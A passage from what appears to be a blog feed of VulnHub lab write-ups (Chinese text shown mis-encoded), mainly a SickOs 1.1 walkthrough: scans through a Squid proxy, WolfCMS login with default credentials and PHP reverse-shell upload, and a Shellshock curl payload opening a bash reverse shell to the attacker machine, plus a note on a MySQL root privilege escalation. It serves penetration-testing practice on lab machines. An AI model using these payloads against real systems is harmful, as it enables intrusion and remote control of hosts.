</p><p>æ‰§è¡Œï¼šå¯ä»¥æŸ¥çœ‹åˆ° Mysql æ˜¯ç”¨ root ç™»é™†çš„</p><p>æŸ¥çœ‹ä¸€ä¸‹ mysql çš„è¿è¡Œæƒé™ï¼Œå¯ä»¥çœ‹åˆ° mysql æ˜¯ä»¥ root è¿è¡Œï¼Œå¹¶ä¸”ä¹Ÿæ˜¾ç¤ºäº† mysql çš„ plugin ç›®å½•</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Raven:/var/www/html$ ./LinEnum.sh | grep mysql<br>./LinEnum.sh | grep mysql<br>uid=110(mysql) gid=116(mysql) groups=116(mysql)<br>mysql:x:110:116:MySQL Server,,,:/nonexistent:/bin/false<br>root        561  0.0  0.3   4340  1616 ?        S    00:48   0:00 /bin/sh /usr/bin/mysqld_safe<br>root        930  0.0 10.4 552240 51516 ?        Sl   00:48   0:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306<br>www-data   1827  0.0  0.2  11136   984 pts/0    S+   00:59   0:00 grep mysql<br>-rwxr-xr-x 1 root root 11873232 Apr 19  2018 /usr/sbin/mysqld<br>-rwxr-xr-x  1 root root  5485 Apr 19  2018 mysql<br>mysql  Ver 14.14 Distrib 5.5.60, for debian-linux-gnu (x86_64) using readline 6.3<br><br>www-data@Raven:/var/www/html$  ps -ef | grep mysql<br> ps -ef|grep mysql<br>root        561      1  0 00:48 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe<br>root        930    561  0 00:48 ?        00:00:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306<br>www-data   2359   1121  0 01:00 pts/0    00:00:00 grep mysql<br></code></pre></td></tr></table></figure><p>æ¼æ´ä¿¡æ¯ï¼š<a href="https://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html">https://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html</a></p><p>å¦‚æœMySQLç‰ˆæœ¬ &lt;= 5.7.14ï¼Œ5.6.32ï¼Œ5.5.51ï¼Œåˆ™æœ‰ MySQL-Exploit-Remote-Root-Code-Execution-Privesc æ¼æ´å¯ä»¥è¿›è¡Œææƒ</p>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Penetration</tag>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SickOsï¼š1.1</title>
    <link href="/2022/07/10/Penetration/Vulnhub/Part-1/0x0C%20SickOs-1.1/"/>
    <url>/2022/07/10/Penetration/Vulnhub/Part-1/0x0C%20SickOs-1.1/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0C-SickOs-1-1-vulnhub"><a href="#0x0C-SickOs-1-1-vulnhub" class="headerlink" title="0x0C SickOs: 1.1~vulnhub"></a>0x0C SickOs: 1.1~vulnhub</h1><blockquote><p>é¶æœºåœ°å€ï¼š<a href="https://www.vulnhub.com/entry/sickos-11,132/">SickOs: 1.1 ~ VulnHub</a></p><p>ç¯å¢ƒä¿¡æ¯ï¼š</p><ul><li>æ”»å‡»æœº IPï¼š192.168.135.141</li><li>é¶æœº IPï¼š192.168.135.157</li></ul></blockquote><h2 id="ä¸€ã€ä¿¡æ¯æ”¶é›†"><a href="#ä¸€ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸€ã€ä¿¡æ¯æ”¶é›†"></a>ä¸€ã€ä¿¡æ¯æ”¶é›†</h2><h3 id="1ã€ä¸»æœºæ¢æµ‹"><a href="#1ã€ä¸»æœºæ¢æµ‹" class="headerlink" title="1ã€ä¸»æœºæ¢æµ‹"></a>1ã€ä¸»æœºæ¢æµ‹</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24</span><br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-09 22:57 EDT<br>Nmap scan report for 192.168.135.2 (192.168.135.2)<br>Host is up (0.0015s latency).<br>Nmap scan report for 192.168.135.141 (192.168.135.141)<br>Host is up (0.010s latency).<br>Nmap done: 256 IP addresses (2 hosts up) scanned in 7.13 seconds<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> sudo arp-scan -l</span><br>[sudo] password for kali: <br>Interface: eth0, type: EN10MB, MAC: 00:0c:29:38:c2:06, IPv4: 192.168.135.141<br>Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)<br>192.168.135.1   00:50:56:c0:00:08       VMware, Inc.<br>192.168.135.2   00:50:56:eb:65:60       VMware, Inc.<br>192.168.135.157 00:0c:29:2b:9b:36       VMware, Inc.<br>192.168.135.254 00:50:56:ea:f7:2c       VMware, Inc.<br><br>4 packets received by filter, 0 packets dropped by kernel<br>Ending arp-scan 1.9.7: 256 hosts scanned in 2.174 seconds (117.76 hosts/sec). 4 responded<br></code></pre></td></tr></table></figure><p><strong>å¾—åˆ°é¶æœº ipï¼š192.168.135.157</strong></p><h3 id="2ã€ç«¯å£æ‰«æ"><a href="#2ã€ç«¯å£æ‰«æ" class="headerlink" title="2ã€ç«¯å£æ‰«æ"></a>2ã€ç«¯å£æ‰«æ</h3><p><strong>å…¨é¢æ‰«æï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -A -p- 192.168.135.157</span><br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-09 23:01 EDT<br>Nmap scan report for 192.168.135.157 (192.168.135.157)<br>Host is up (0.0042s latency).<br>Not shown: 65532 filtered ports<br>PORT     STATE  SERVICE    VERSION<br>22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)<br>|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)<br>|_  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)<br>3128/tcp open   http-proxy Squid http proxy 3.1.19<br>|_http-server-header: squid/3.1.19<br>|_http-title: ERROR: The requested URL could not be retrieved<br>8080/tcp closed http-proxy<br>MAC Address: 00:0C:29:2B:9B:36 (VMware)<br>Device type: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure><p><strong>å¾—åˆ°ç›®æ ‡ç«¯å£ä¿¡æ¯ï¼š</strong></p><div class="table-container"><table><thead><tr><th>PORT</th><th>STATE</th><th>SERVICE</th><th>VERSION</th></tr></thead><tbody><tr><td>22/tcp</td><td>open</td><td>ssh</td><td>OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)</td></tr><tr><td>3128/tcp</td><td>open</td><td>http-proxy</td><td>Squid http proxy 3.1.19</td></tr><tr><td>8080/tcp</td><td>closed</td><td>http-proxy</td></tr></tbody></table></div><h3 id="3ã€ç«¯å£æ¢æµ‹"><a href="#3ã€ç«¯å£æ¢æµ‹" class="headerlink" title="3ã€ç«¯å£æ¢æµ‹"></a>3ã€ç«¯å£æ¢æµ‹</h3><p><strong>22ç«¯å£</strong></p><p>æš‚æ—¶æœªå¾—åˆ° username å’Œ password çš„ç›¸å…³ä¿¡æ¯ï¼Œæ— æ³•ä½¿ç”¨ ssh</p><p><strong>3128ç«¯å£</strong></p><p>é€šè¿‡ Nmap æ‰«åˆ°çš„ç«¯å£ä¿¡æ¯å¯çŸ¥ï¼Œ3128 ç«¯å£å¼€æ”¾äº†ä¸€ä¸ªä»£ç†æœåŠ¡ï¼Œç›´æ¥è®¿é—®æ˜¯è®¿é—®ä¸äº†é¶æœºçš„ 80 ç«¯å£çš„ï¼Œå¯ä»¥å€ŸåŠ©å®ƒçš„ä»£ç†æ¥è®¿é—®ï¼Œè®¾ç½®æµè§ˆå™¨ä»£ç†ï¼Œè¿›è¡Œè®¿é—® <code>http://192.168.135.157</code> ï¼Œå¾—åˆ°ï¼šBLEHHH!!! </p><p>è¿›è¡Œç›®å½•çˆ†ç ´ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://192.168.135.157 -p http://192.168.135.157:3128</span>                                                 <br>-----------------<br>URL_BASE: http://192.168.135.157/<br>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br>PROXY: http://192.168.135.157:3128<br>-----------------                                                        <br><br>---- Scanning URL: http://192.168.135.157/ ----<br>+ http://192.168.135.157/cgi-bin/ (CODE:403|SIZE:291)<br>+ http://192.168.135.157/connect (CODE:200|SIZE:109)<br>+ http://192.168.135.157/index (CODE:200|SIZE:21)<br>+ http://192.168.135.157/index.php (CODE:200|SIZE:21)<br>+ http://192.168.135.157/robots (CODE:200|SIZE:45)<br>+ http://192.168.135.157/robots.txt (CODE:200|SIZE:45)<br>+ http://192.168.135.157/server-status (CODE:403|SIZE:296)<br></code></pre></td></tr></table></figure><p>å‘ç° robots.txtï¼Œè®¿é—® <code>http://192.168.135.157/robots.txt</code> ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">User-agent</span><span class="hljs-punctuation">: </span>*<br><span class="hljs-attribute">Disallow</span><span class="hljs-punctuation">: </span>/<br><span class="hljs-attribute">Dissalow</span><span class="hljs-punctuation">: </span>/wolfcms<br></code></pre></td></tr></table></figure><p>å‘ç° wolfcms é¡µé¢ï¼Œè®¿é—® <code>http://192.168.135.157/wolfcms/</code> ï¼Œå‘ç°æ˜¯ä¸ª CMS ï¼ŒæŸ¥è¯¢å¯çŸ¥ï¼Œwolfcms æœ‰åå°æ–‡ä»¶ä¸Šä¼ æ¼æ´</p><p>ä½¿ç”¨å…¶ä»–å·¥å…·è¿›è¡Œæ‰«æï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gobuster dir -u http://192.168.135.157/wolfcms/  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 --random-agent   --proxy   http://192.168.135.157:3128</span><br>===============================================================<br>Gobuster v3.1.0<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.135.157/wolfcms/<br>[+] Method:                  GET<br>[+] Threads:                 50<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] Proxy:                   http://192.168.135.157:3128<br>[+] User Agent:              Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16<br>[+] Timeout:                 10s<br>===============================================================<br>2022/07/10 04:33:24 Starting gobuster in directory enumeration mode<br>===============================================================<br>/docs                 (Status: 301) [Size: 325] [--&gt; http://192.168.135.157/wolfcms/docs/]<br>/public               (Status: 301) [Size: 327] [--&gt; http://192.168.135.157/wolfcms/public/]<br>/config               (Status: 200) [Size: 0]                                               <br>/favicon              (Status: 200) [Size: 894]                                             <br>/robots               (Status: 200) [Size: 0]                                               <br>/index                (Status: 200) [Size: 3975]                                            <br>/wolf                 (Status: 301) [Size: 325] [--&gt; http://192.168.135.157/wolfcms/wolf/]  <br>/composer             (Status: 200) [Size: 403]                                             <br>                                                                                            <br>===============================================================<br>2022/07/10 04:34:35 Finished<br>===============================================================<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> dirsearch -u http://192.168.135.157 --proxy http://192.168.135.157:3128</span>     <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br>Output File: /home/kali/.dirsearch/reports/192.168.135.157/_22-07-10_05-01-37.txt<br>Error Log: /home/kali/.dirsearch/logs/errors-22-07-10_05-01-37.log<br>Target: http://192.168.135.157/<br><br>[05:01:37] Starting: <br>[05:01:59] 403 -  291B  - /cgi-bin/                                         <br>[05:02:03] 403 -  302B  - /doc/en/changes.html                              <br>[05:02:03] 403 -  302B  - /doc/html/index.html                              <br>[05:02:03] 403 -  287B  - /doc/<br>[05:02:03] 403 -  301B  - /doc/stable.version<br>[05:02:03] 403 -  291B  - /doc/api/<br>[05:02:09] 200 -   21B  - /index                                            <br>[05:02:09] 200 -   21B  - /index.php                                                                        <br>[05:02:23] 200 -   45B  - /robots.txt                                       <br>[05:02:24] 403 -  297B  - /server-status/                                   <br>[05:02:24] 403 -  296B  - /server-status<br>                                                                             <br>Task Completed   <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> nikto -h 192.168.135.157 -useproxy http://192.168.135.157:3128</span><br>- Nikto v2.1.6<br>---------------------------------------------------------------------------<br>+ Target IP:          192.168.135.157<br>+ Target Hostname:    192.168.135.157<br>+ Target Port:        80<br>+ Proxy:              192.168.135.157:3128<br>+ Start Time:         2022-07-10 04:56:36 (GMT-4)<br>---------------------------------------------------------------------------<br>+ Server: Apache/2.2.22 (Ubuntu)<br>+ Retrieved via header: 1.0 localhost (squid/3.1.19)<br>+ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.21<br>+ The anti-clickjacking X-Frame-Options header is not present.<br>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br>+ Uncommon header &#x27;x-cache&#x27; found, with contents: MISS from localhost<br>+ Uncommon header &#x27;x-cache-lookup&#x27; found, with contents: MISS from localhost:3128<br>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br>+ Server may leak inodes via ETags, header found with file /robots.txt, inode: 265381, size: 45, mtime: Fri Dec  4 19:35:02 2015<br>+ Uncommon header &#x27;tcn&#x27; found, with contents: list<br>+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for &#x27;index&#x27; were found: index.php<br>+ Server banner has changed from &#x27;Apache/2.2.22 (Ubuntu)&#x27; to &#x27;squid/3.1.19&#x27; which may suggest a WAF, load balancer or proxy is in place<br>+ Uncommon header &#x27;x-squid-error&#x27; found, with contents: ERR_INVALID_REQ 0<br>+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.<br>+ Uncommon header &#x27;93e4r0-cve-2014-6271&#x27; found, with contents: true<br>+ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the &#x27;shellshock&#x27; vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).<br>+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.<br>+ 8726 requests: 0 error(s) and 15 item(s) reported on remote host<br>+ End Time:           2022-07-10 04:57:14 (GMT-4) (38 seconds)<br>---------------------------------------------------------------------------<br>+ 1 host(s) tested<br></code></pre></td></tr></table></figure><p>nikto æ‰«æå‡ºä¸€ä¸ª shellshock æ¼æ´</p><h2 id="äºŒã€æƒé™è·å–"><a href="#äºŒã€æƒé™è·å–" class="headerlink" title="äºŒã€æƒé™è·å–"></a>äºŒã€æƒé™è·å–</h2><h3 id="1ã€Upload-file"><a href="#1ã€Upload-file" class="headerlink" title="1ã€Upload file"></a>1ã€Upload file</h3><blockquote><p><a href="https://www.cnblogs.com/yujin2020/p/14187067.html">Wolf CMSåå°æ–‡ä»¶ä¸Šä¼ getshellå¹¶ææƒ - èª‰æ´¥ - åšå®¢å›­ (cnblogs.com)</a></p></blockquote><p>è®¿é—® <code>http://192.168.135.157/wolfcms/docs/updating</code> ï¼Œå¾—åˆ° wolfcms ç‰ˆæœ¬ï¼š0.8.2</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment"># Wolf CMS - INFORMATION ABOUT UPDATING</span><br><br><span class="hljs-comment">## GENERAL ##</span><br>Please be aware that we only support single <span class="hljs-built_in">version</span> upgrades.<br>IMPORTANT - always check your security <span class="hljs-keyword">by</span> viewing security.php <span class="hljs-built_in">post</span> update!<br><br><span class="hljs-comment">### Upgrading from 0.8.1 =&gt; 0.8.2 ###</span><br>SECURITY UPDATE - This release <span class="hljs-keyword">contains</span> <span class="hljs-keyword">a</span> <span class="hljs-literal">one</span>-<span class="hljs-built_in">file</span> security patch.<br>There are no database changes <span class="hljs-keyword">in</span> this release <span class="hljs-keyword">and</span> only <span class="hljs-literal">one</span> <span class="hljs-built_in">file</span> <span class="hljs-keyword">contains</span> code changes,<br>so you can upgrade <span class="hljs-keyword">by</span> simply replacing wolf/plugins/archive/archive.php <span class="hljs-keyword">and</span> index.php.<br>Index.php needs replacing only because <span class="hljs-keyword">it</span> <span class="hljs-keyword">contains</span> <span class="hljs-keyword">the</span> updated <span class="hljs-built_in">version</span> <span class="hljs-built_in">number</span>, either<br><span class="hljs-built_in">replace</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">file</span> <span class="hljs-keyword">or</span> update <span class="hljs-keyword">the</span> <span class="hljs-built_in">version</span> <span class="hljs-built_in">number</span> <span class="hljs-keyword">by</span> hand.<br></code></pre></td></tr></table></figure><p>æ­¤ç‰ˆæœ¬å­˜åœ¨åå°æ–‡ä»¶ä¸Šä¼ ï¼Œè®¿é—® <code>http://192.168.135.157/wolfcms/?/admin/login</code> ï¼Œè¿›å…¥åå°ç™»å½•ç•Œé¢</p><p>å°è¯•å¼±å£ä»¤ <code>admin:admin</code> ç™»å½•ï¼ŒæˆåŠŸç™»é™†ï¼Œåœ¨ <code>Files</code> ä¸‹å‘ç°å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œä¸Šä¼ åå¼¹ shell ï¼Œkali ç›‘å¬ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 1234</span><br>listening on [any] 1234 ...<br></code></pre></td></tr></table></figure><p>è®¿é—® <code>http://192.168.135.157/wolfcms/public/php-reverse-shell.php</code> ï¼ŒæˆåŠŸåå¼¹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 1234</span><br>listening on [any] 1234 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.157] 50480<br>Linux SickOs 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux<br> 11:11:51 up  2:45,  0 users,  load average: 54.24, 52.71, 36.84<br>USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br>/bin/sh: 0: can&#x27;t access tty; job control turned off<br><span class="hljs-meta">$</span><span class="bash"> </span><br></code></pre></td></tr></table></figure><h3 id="2ã€Shellshock"><a href="#2ã€Shellshock" class="headerlink" title="2ã€Shellshock"></a>2ã€Shellshock</h3><blockquote><p> <a href="https://jhalon.github.io/vulnhub-sick-os1/">https://jhalon.github.io/vulnhub-sick-os1/</a></p></blockquote><p>It seems that wolfcms is a blog. I thoroughly reviewed the content to see if there wasnâ€™t anything of value. Unfortunately, there wasnâ€™t - so I decided to take advantage of the Shellshock vulnerability and attempt a <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">reverse tcp shell</a> on the server.</p><p>First things first, we have to set up a netcat listener.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@kali:~# nc -lnvp 1234<br>listening on [any] 1234 ...<br></code></pre></td></tr></table></figure><p>Now before we exploit Shellshock, we need to understand what the vulnerability is, and how it works. So let me explain before we begin exploiting it.</p><p>Shellshock - <a href="http://www.cvedetails.com/cve/cve-2014-6271">CVE-2014-6271</a> and <a href="http://www.cvedetails.com/cve/cve-2014-6278">CVE-2014-6278</a> - was a serious vulnerability found in the Bash command shell, which is commonly used in Linux distributions. The vulnerability allowed attackers to run arbitrary commands on an affected system. The most commonly affected webs server where the ones using the <a href="http://www.cgi101.com/book/ch3/text.html">CGI Environment</a>.</p><p>In general - Bash allows the exporting of shell function to other bash instances on the server. It is done by creating an environmental variable with the function definition as suchâ€¦</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">env <span class="hljs-attribute">ENV_VAR_FN</span>=â€™() &#123; &lt;your function&gt; &#125;;â€™<br></code></pre></td></tr></table></figure><p>The <strong>ENV_VAR_FN</strong> is the function that is executed in the bash instance. Unfortunately, there was a bug in the implementation of this to where the function continued to read and execute beyond the function definition - allowing to run additional code. Technically it should have stopped reading past the function definition, marked with a <code>;</code>.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">env ENV_VAR_FN=â€™() &#123; <span class="hljs-tag">&lt;<span class="hljs-name">your</span> <span class="hljs-attr">function</span>&gt;</span> &#125;; <span class="hljs-tag">&lt;<span class="hljs-name">attacker</span> <span class="hljs-attr">code</span> <span class="hljs-attr">here</span>&gt;</span>â€™<br></code></pre></td></tr></table></figure><p>Many services were affected by this bug. Any web server that consumed user input and added the input to the bash environment, was vulnerable. A possible exploit in the CGI Environment would look like this.</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">GET <span class="hljs-regexp">/&lt;server path&gt; HTTP/</span><span class="hljs-number">1.1</span><br><br>User-agent: () &#123; :;&#125;; echo something&gt;<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>new_file<br></code></pre></td></tr></table></figure><p>This command would create a file called <strong>new_file</strong>, which an attacker could use to their advantage. So, since we now know that <strong>cgi-bin/status</strong> is exploitable, and we know â€œhowâ€ to exploit it, let go ahead and do so!</p><p>We will be leveraging the <a href="https://curl.haxx.se/docs/manpage.html">cURL</a> command for this vulnerability. This way we can send edited User-Agent header information that will be accepted by the CGIâ€™s Bash environment.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@kali:~# curl -x http://192.168.135.157:3128 -H &quot;User-Agent: () &#123; ignored;&#125;;/bin/bash -i &gt;&amp; /dev/tcp/192.168.135.141/1234 0&gt;&amp;1&quot; http://192.168.135.157/cgi-bin/status<br></code></pre></td></tr></table></figure><p>What I did there was use the <strong>-x</strong> switch to initiate a connection using our HTTP Proxy, and then used the <strong>-H</strong> switch to include a edited User-Agent header. The code I executed was a reverse tcp bash shell. If done correctly, we should have gotten a reverse shell through netcat!</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 1234</span><br>listening on [any] 1234 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.157] 41481<br>bash: no job control in this shell<br>www-data@SickOs:/usr/lib/cgi-bin$ whoami<br>whoami<br>www-data<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨è„šæœ¬ï¼Œsearchsploit æŸ¥æ‰¾ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit shellshock apache</span><br>-------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                            |  Path<br>-------------------------------------------------------------------------- ---------------------------------<br>Apache mod_cgi - &#x27;Shellshock&#x27; Remote Command Injection                    | linux/remote/34900.py<br>-------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat /usr/share/exploitdb/exploits/linux/remote/34900.py</span>                     <br>[......]<br><br>Usage:<br>./exploit.py var=&lt;value&gt;<br><br>Vars:<br>rhost: victim 